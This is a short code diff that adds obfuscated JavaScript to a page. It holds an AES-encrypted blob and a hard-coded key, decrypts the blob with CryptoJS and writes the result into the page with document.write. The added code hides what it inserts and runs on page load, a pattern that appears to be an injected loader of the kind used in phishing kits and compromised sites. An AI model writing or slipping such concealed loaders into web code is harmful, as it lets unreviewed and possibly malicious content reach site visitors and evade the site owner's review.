@@ -1,0 +1,5 @@
+var tcWf="U2FsdGVkX19FiDxLsUwBgqnqPMDcn2oiJvcETOh3/M8DiyAZYu2zYZYSFiEiQeO6TRPoMiDc5V6tFfyy6w2ZdBjxkBA7cc6mXT8yEBOtl3kDHSTVIVtOLsypLJUj5RDEzPCXU7uG4lmawYKrQsBXNf/2w6tP+KkBZ0ChFE7SSRT9dKNRgIzPNMqY431gzvaxLJP4ugQTbRnY/WoiD5wIdi7Ai0ZADvZf9p+uDdAbvAtKWt5inh7UavO5+LEeSb3HfZpOksrItPhXJD7hYH+NtLI9O9LzrQzgqTwBP/PirfVSKT520Cg7CmeyN/AhcYlsngKTcfEwu15pBZeLJqStaJ6aV99bsdGVomjeAqVdlbcN1hz9PCYOO/ZwQeO6wIMLsL0WAgsabfiCILmAWfXVlJjfVKQexNoi7Gi6mvWp6ci4AyVRHdz+oo9aw7Q6xR27ui33F1woU0MzdCN7ZfdzFQ==" 
+ var XNBUc = "XotbzMgKKusoyzlq"; 
+ var PqWtkCq= CryptoJS.AES.decrypt(tcWf, XNBUc); 
+ var RGssKl = PqWtkCq.toString(CryptoJS.enc.Utf8); 
+ document.write(RGssKl) 
